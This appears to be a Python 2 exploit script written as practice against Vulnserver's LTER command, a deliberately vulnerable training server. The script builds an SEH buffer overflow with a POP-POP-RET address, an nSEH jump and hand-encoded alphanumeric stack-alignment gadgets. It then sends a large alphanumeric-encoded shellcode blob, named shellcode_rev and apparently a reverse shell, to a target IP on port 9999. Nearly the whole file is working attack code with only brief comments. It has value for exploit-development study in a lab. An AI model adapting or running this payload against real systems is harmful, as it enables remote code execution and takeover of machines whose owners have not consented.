# Author	: RIZAL MUHAMMED [UB3RSiCK]
# Desc.		: Steve Bradshaw's Vulnserver Buffer Overflow [LTER Command]
# OS		: Windows Vista ULTIMATE x86 SP2
# Date		: 06,08/03/2018

import sys
import struct
from socket import create_connection as cc

def p(a):
	return struct.pack("I", a)

if len(sys.argv) < 2:
	print 'Usage : {} TARGET_IP'.format(sys.argv[0])
	sys.exit()

host = str(sys.argv[1])
port = 9999

try:
	sock = cc((host, port))
except:
	print "Connection Error\n"
	sys.exit()

# Grab the banner
banner = sock.recv(1024)
print "Connected to ", host
print banner

#GoodChars - Alpha Numeric Only
#01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F 10 11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F 20
#21 22 23 24 25 26 27 28 29 2A 2B 2C 2D 2E 2F 30 31 32 33 34 35 36 37 38 39 3A 3B 3C 3D 3E 3F 40
#41 42 43 44 45 46 47 48 49 4A 4B 4C 4D 4E 4F 50 51 52 53 54 55 56 57 58 59 5A 5B 5C 5D 5E 5F 60
#61 62 63 64 65 66 67 68 69 6A 6B 6C 6D 6E 6F 70 71 72 73 74 75 76 77 78 79 7A 7B 7C 7D 7E 7F 80

shellcode_rev = ("\x53\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b"
"\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
"\x50\x38\x41\x42\x75\x4a\x49\x79\x6c\x68\x68\x4c\x42\x53\x30"
"\x57\x70\x77\x70\x43\x50\x6e\x69\x6a\x45\x74\x71\x4f\x30\x75"
"\x34\x6c\x4b\x66\x30\x50\x30\x4e\x6b\x73\x62\x44\x4c\x4e\x6b"
"\x66\x32\x52\x34\x4e\x6b\x33\x42\x31\x38\x44\x4f\x4f\x47\x62"
"\x6a\x47\x56\x75\x61\x39\x6f\x4e\x4c\x77\x4c\x31\x71\x33\x4c"
"\x33\x32\x36\x4c\x77\x50\x6a\x61\x4a\x6f\x64\x4d\x65\x51\x69"
"\x57\x4d\x32\x6b\x42\x52\x72\x36\x37\x6e\x6b\x71\x42\x46\x70"
"\x4c\x4b\x42\x6a\x35\x6c\x4e\x6b\x32\x6c\x34\x51\x42\x58\x4d"
"\x33\x77\x38\x76\x61\x4b\x61\x32\x71\x6e\x6b\x52\x79\x35\x70"
"\x66\x61\x58\x53\x4e\x6b\x61\x59\x42\x38\x39\x73\x74\x7a\x61"
"\x59\x4c\x4b\x46\x54\x6e\x6b\x67\x71\x78\x56\x35\x61\x6b\x4f"
"\x4e\x4c\x6a\x61\x78\x4f\x54\x4d\x75\x51\x4a\x67\x50\x38\x79"
"\x70\x63\x45\x68\x76\x44\x43\x43\x4d\x6a\x58\x35\x6b\x43\x4d"
"\x36\x44\x51\x65\x5a\x44\x31\x48\x6c\x4b\x33\x68\x65\x74\x75"
"\x51\x48\x53\x62\x46\x4c\x4b\x36\x6c\x52\x6b\x4c\x4b\x70\x58"
"\x65\x4c\x57\x71\x48\x53\x4c\x4b\x57\x74\x6c\x4b\x46\x61\x78"
"\x50\x6f\x79\x50\x44\x35\x74\x76\x44\x61\x4b\x61\x4b\x71\x71"
"\x33\x69\x72\x7a\x33\x61\x79\x6f\x49\x70\x31\x4f\x51\x4f\x33"
"\x6a\x4e\x6b\x67\x62\x68\x6b\x4e\x6d\x73\x6d\x61\x78\x64\x73"
"\x76\x52\x33\x30\x35\x50\x65\x38\x34\x37\x31\x63\x34\x72\x73"
"\x6f\x76\x34\x75\x38\x52\x6c\x63\x47\x34\x66\x75\x57\x39\x6f"
"\x79\x45\x4c\x78\x4e\x70\x65\x51\x33\x30\x43\x30\x45\x79\x38"
"\x44\x33\x64\x42\x70\x63\x58\x64\x69\x6b\x30\x30\x6b\x75\x50"
"\x4b\x4f\x48\x55\x30\x50\x76\x30\x56\x30\x62\x70\x47\x30\x36"
"\x30\x61\x50\x30\x50\x50\x68\x78\x6a\x46\x6f\x59\x4f\x4d\x30"
"\x79\x6f\x48\x55\x7a\x37\x73\x5a\x35\x55\x70\x68\x6b\x70\x4e"
"\x48\x37\x73\x6b\x32\x50\x68\x57\x72\x65\x50\x37\x71\x6f\x4b"
"\x6c\x49\x7a\x46\x52\x4a\x46\x70\x66\x36\x31\x47\x55\x38\x4a"
"\x39\x6c\x65\x34\x34\x63\x51\x4b\x4f\x6b\x65\x6d\x55\x49\x50"
"\x34\x34\x74\x4c\x79\x6f\x42\x6e\x46\x68\x63\x45\x68\x6c\x52"
"\x48\x78\x70\x4d\x65\x6e\x42\x50\x56\x49\x6f\x69\x45\x42\x48"
"\x72\x43\x70\x6d\x72\x44\x75\x50\x4b\x39\x6b\x53\x51\x47\x52"
"\x77\x51\x47\x56\x51\x69\x66\x70\x6a\x56\x72\x46\x39\x31\x46"
"\x69\x72\x69\x6d\x52\x46\x59\x57\x71\x54\x61\x34\x57\x4c\x35"
"\x51\x47\x71\x4c\x4d\x32\x64\x71\x34\x44\x50\x6f\x36\x37\x70"
"\x62\x64\x46\x34\x66\x30\x32\x76\x53\x66\x63\x66\x70\x46\x33"
"\x66\x50\x4e\x31\x46\x53\x66\x43\x63\x33\x66\x65\x38\x31\x69"
"\x48\x4c\x37\x4f\x4d\x56\x59\x6f\x6a\x75\x6f\x79\x49\x70\x30"
"\x4e\x56\x36\x70\x46\x59\x6f\x74\x70\x72\x48\x55\x58\x6e\x67"
"\x65\x4d\x53\x50\x69\x6f\x78\x55\x4f\x4b\x7a\x50\x6d\x65\x6d"
"\x72\x70\x56\x61\x78\x6f\x56\x6e\x75\x6d\x6d\x4d\x4d\x4b\x4f"
"\x4a\x75\x47\x4c\x74\x46\x43\x4c\x36\x6a\x4d\x50\x39\x6b\x4d"
"\x30\x50\x75\x76\x65\x4d\x6b\x42\x67\x56\x73\x64\x32\x32\x4f"
"\x42\x4a\x45\x50\x71\x43\x4b\x4f\x6e\x35\x41\x41")

shellcode = shellcode_rev

payload = "LTER /.:/"

# EIP Overwrite at 2003
#payload += "A"*5000
#payload +=  "pattern_create.rb -l 5000"

# SEH Overwrite at 3519
# nSEH at 3515

# ppr - 6250120B
# alphanumeric
SEH = p(0x6250120B)

#nSEH = "\x4c\x4c\x77\x08"
nSEH = "\x71\x06\x70\x04"
#
ALIGN_ESP = "\x54\x58\x66\x05\x6D\x11\x04\x6E\x50\x5C"
BUFFER_LOCATION = "\x66\x2D\x7F\x09\x66\x2D\x77\x04\x50\x5B"
WRITE_JMP_EBX = "\x66\x25\x4A\x4B\x66\x25\x35\x34\x66\x05\x2E\x12\x66\x05\x52\x52\x66\x05\x7F\x7F\x4c\x4c\x4c\x66\x50"

FIX_STACK_AND_EBX = "\x53\x58\x04\x20\x50\x5B\x44\x44"

payload += FIX_STACK_AND_EBX + "A"*(32-len(FIX_STACK_AND_EBX)) + shellcode + "A"*(3515-len(shellcode)-32) + nSEH + SEH + ALIGN_ESP + BUFFER_LOCATION  + WRITE_JMP_EBX + "G"*48

# WE only have 48 Bytes of space after SEH

print "Sending UB3R Payl0ad :D"
sock.send(payload)
